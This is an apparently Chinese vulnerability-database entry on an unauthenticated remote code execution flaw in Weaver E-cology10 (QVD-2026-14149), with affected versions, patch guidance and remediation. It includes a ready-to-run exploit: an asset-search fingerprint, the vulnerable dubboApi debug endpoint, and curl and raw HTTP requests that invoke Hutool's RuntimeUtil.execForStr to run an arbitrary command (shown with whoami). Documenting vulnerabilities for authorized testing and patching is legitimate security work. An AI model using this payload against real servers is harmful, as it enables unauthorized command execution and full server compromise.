## 漏洞描述

泛微 E-cology10（E10）存在未授权远程代码执行漏洞（QVD-2026-14149）。奇安信 CERT 通告显示，未经身份验证的远程攻击者可向特定接口发送恶意请求，在目标服务器上执行任意代码（可结合文件上传/文件写入类行为，或通过 file 相关接口/参数触发）并获取服务器权限；CVSS 评分约 9.8（CRITICAL）。官方已发布修复补丁（对应版本 v20260312 及之后）。

**注意**：
- 奇安信 CERT 通告原文称 PoC 未公开；第三方文库（北风漏洞复现文库，经 gm7.org 转载）已公开完整 PoC 与请求示例，本条目按已公开内容收录，来源见参考。
- 本条目只覆盖 E-cology10 QVD-2026-14149；E-Cology 8.0-9.0 getFileViewUrl SSRF、eteams 越权等漏洞各自独立编号，不要合并。

## 影响版本

- 泛微 E-cology10，补丁版本早于 v20260312（以官方补丁版本核对为准）

## 前置条件

- 目标为暴露在外的泛微 E-cology10
- 未授权利用（官方通告确认；公开 PoC 无需认证）

## 利用步骤

1. 识别目标为泛微 E-cology10（登录页 /login.jsp、厂商特征；资产测绘特征 icon_hash="-1619753057"）
2. 未认证向 `/papi/esearch/data/devops/dubboApi/debug/method` 发送 POST 请求，通过 `interfaceName` 指定 `cn.hutool.core.util.RuntimeUtil`、`methodName` 指定 `execForStr`，在 JSON 数组参数中传入要执行的命令
3. 响应中返回命令执行结果即存在漏洞
4. 仅限授权测试，避免执行破坏性命令

## Payload

```bash
curl -s -X POST "http://target/papi/esearch/data/devops/dubboApi/debug/method?interfaceName=cn.hutool.core.util.RuntimeUtil&methodName=execForStr" \
  -H "Content-Type: application/json;charset=utf-8" \
  -d '[["whoami"]]'
```

公开来源原始请求：

```http
POST /papi/esearch/data/devops/dubboApi/debug/method?interfaceName=cn.hutool.core.util.RuntimeUtil&methodName=execForStr HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json;charset=utf-8

[["whoami"]]
```

## 验证方法

1. 识别目标是否为 E-cology10（登录页 /login.jsp、版本信息）
2. 核对补丁版本是否低于 v20260312
3. 已公开 PoC 可参考本条目 Payload 做授权验证；同时核对补丁版本（v20260312 及之后不受影响）
4. 若确认受影响，联系厂商获取补丁并升级

```bash
curl -s "http://target/login.jsp" | grep -iE "weaver|ecology|泛微"
```

## 修复建议

1. 升级至官方修复版本（v20260312 及之后）
2. 在修复前限制 E-cology10 外网暴露面
3. 监控应用服务器异常进程/命令执行行为
